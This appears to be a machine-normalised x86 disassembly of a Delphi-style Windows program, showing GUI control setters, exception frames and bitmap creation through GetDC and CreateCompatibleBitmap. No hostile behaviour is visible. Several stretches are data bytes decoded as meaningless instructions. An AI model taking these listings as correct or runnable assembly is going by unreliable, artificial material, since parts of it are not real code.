arpl [ ebp ] ax
xor al 0x63
inc ebp
add [ eax ] bh
arpl [ ebp ] ax
cmp al 0x63
inc ebp
add [ eax + 0x63 ] al
inc ebp
add [ ebx + 0x45 ] al
add [ eax + 0x63 ] cl
inc ebp
add [ ebx + 0x45 ] cl
add [ eax + 0x63 ] dl
inc ebp
add [ ebx + 0x45 ] dl
add [ eax + 0x63 ] bl
inc ebp
add [ ebx + 0x45 ] bl
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xfde85653
xlat
cli
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov eax esi
call sub_421918
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
mov edx esi
call sub_456118
sub_455d04
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421918
test bl bl
jle r-xdata
mov edx esi
call sub_456118
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_455d74
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42142c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_455e1c
sub_455da8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_455d38
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4184a0
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41862c
sub_455df0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_40435c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403fa4
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_455e1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_456118
mov edx ebx
mov eax esi
call sub_4560f8
sub_455e44
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_455e1c
sub_455e70
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46ab18
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403350
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4219a4
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_446d5c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455ec8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46ab40
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403350
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4219c0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_446d5c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455f20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420fcc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4560a4
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_455f8c
push ebx
push esi
push edi
call sub_403508
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403154
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418698
call sub_403154
mov eax [ edi + 0x30 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421018
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034f0
sub_455fdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_456024
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41860c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov edx edi
call sub_455da8
sub_456070
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_457920
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_457964
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_42109c
sub_4560b0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_456118
sub_4560f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418454
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_42109c
pop esi
pop ebx
retn
sub_456118
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41874c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_456134
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_45619c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4609f0
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_4591bc
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4569a4
mov edx ebp
call sub_456a5c
inc eax
je r-xdata
sub_456228
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_456248
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_456360
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4218d4
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4563b4
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403154
mov eax [ esi + 0x9c ]
call sub_403154
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455d04
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d130
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_456404
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c90
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_4564b0
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_456510
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_456618
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_456750
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4567b0
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_45680c
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_456870
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4564b0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_40435c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403fa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_456510
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_456608
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_456068
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_456054
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_456510
sub_456618
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_456690
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_40435c
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403fa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
sub_4566f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_456750
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_40435c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403fa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_4567b0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_45680c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_456870
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4185b0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403304
test eax eax
je r-xdata
sub_4568d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_40435c
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_421524
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4564b0
sub_45691c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_456944
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_455e70
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_456510
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_4569cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x90 ] eax
sub_456a00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_456a30
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a4cc
mov edi eax
mov eax esi
call sub_4594a8
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_456a5c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_456aa0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_456ac5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456acc
retn
sub_456bb5
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] dh
insd
inc ebp
add [ eax + 0x8004577 ] al
jpo r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
add al al
jbe r-xdata
add [ eax ] al
and bl al
mov eax eax
push ebx
push esi
test dl dl
je r-xdata
outsd
jae r-xdata
add [ esp + edx ] bl
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax - 0x4bffba94 ] dl
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
ror [ ebx - 0x5cde173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x2de80f74 ] 0xc8
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
and [ ebp + 0x41 ] ch
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
inc ebp
add [ eax ] ah
insd
inc ecx
add [ ebp + ebp * 2 + 0x7fbc0045 ] bl
inc ebp
add [ eax - 0x80 ] cl
inc ebp
add al al
js r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
mov eax eax
add [ ecx ] al
add bh ch
call eax
js r-xdata
dec [ ebx - 0x157e30 ]
add [ eax ] dl
push esp
inc ebx
jne r-xdata
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x2800408d
insb
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
sub_456cdc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_420fcc
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_456d30
push ebx
push esi
push edi
call sub_403508
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418698
mov edx eax
mov eax edi
call sub_457920
mov eax [ edi + 0x50 ]
call sub_403154
mov eax edi
call sub_456ff4
mov eax [ edi + 0x4c ]
call sub_403154
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421018
test bl bl
jle r-xdata
call sub_403154
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034f0
sub_456d9c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_456e49
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_4578a8
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_456e68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_456e68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456f09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_428798
mov eax ebx
call sub_427c78
mov eax [ eax + 0x14 ]
xor edx edx
call sub_4247f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416f24
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_427c78
pop edx
